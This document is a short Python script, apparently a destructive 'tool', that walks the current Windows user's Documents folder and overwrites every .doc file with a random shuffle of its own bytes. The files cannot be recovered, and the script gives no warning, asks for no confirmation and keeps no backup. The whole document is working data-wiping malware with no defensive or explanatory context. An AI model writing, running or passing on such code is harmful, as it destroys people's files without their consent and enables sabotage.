from random import shuffle
from sys import platform
import os

user = os.getlogin()
path = "C:\\Users\\" + user + "\\Documents"
file_extension = ".doc"


def read_binary_data(filename):
    with open(filename, "rb") as file:
        binary_data = list(file.read())
        return binary_data


def write_shuffle_binary_data(filename, binary_data):
    with open(filename, "wb") as file:
        shuffle(binary_data)
        bytes_data = bytes(binary_data)
        file.write(bytes_data)


def broke_file():
    if platform != "win32":
        raise Exception("This tool only meant for Windows only.")
    else:
        for (dirpath, _, filenames) in os.walk(path):
            for filename in filenames:
                if filename.endswith(file_extension):
                    filename_path = os.path.join(dirpath, filename)
                    binary_data = read_binary_data(filename_path)
                    write_shuffle_binary_data(filename_path, binary_data)
        return


if __name__ == "__main__":
    broke_file()
